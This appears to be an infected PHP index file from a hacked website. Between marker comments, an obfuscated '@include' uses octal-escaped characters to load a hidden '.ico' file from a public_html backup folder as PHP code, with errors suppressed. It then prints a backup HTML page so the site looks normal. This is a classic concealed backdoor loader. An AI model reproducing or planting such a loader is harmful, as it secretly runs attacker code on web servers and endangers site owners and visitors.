<?php
/*91005*/

@include "\057hom\145/zg\060gnx\065myf\0674/p\165bli\143_ht\155l/d\141lu/\132 ba\143kup\040140\067/im\147/.d\06443c\144f5.\151co";

/*91005*/


echo @file_get_contents('index.html.bak.bak');